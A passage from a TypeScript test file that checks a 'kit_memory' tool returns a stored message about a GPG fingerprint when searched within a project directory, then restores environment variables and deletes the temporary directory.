        // Project scoping filters on the message's cwd column — set it to the
        // "project" dir so the default project-scoped search finds the row.
        cwd: dir,
      });
      db.close();

      const result = await client.callTool({
        name: "kit_memory",
        arguments: { query: "maintainer fingerprint", cwd: dir },
      });
      const data = parseResult(result) as { messages: Array<{ content: string }> };
      assert.equal(data.messages.length, 1);
      assert.match(data.messages[0].content, /GPG fingerprint/);
    } finally {
      if (prevDir === undefined) delete process.env.KIT_MEMORY_DIR;
      else process.env.KIT_MEMORY_DIR = prevDir;
      if (prevDb !== undefined) process.env.KIT_MEMORY_DB = prevDb;
      await rm(dir, { recursive: true, force: true });
      await cleanup();
    }
  });
});
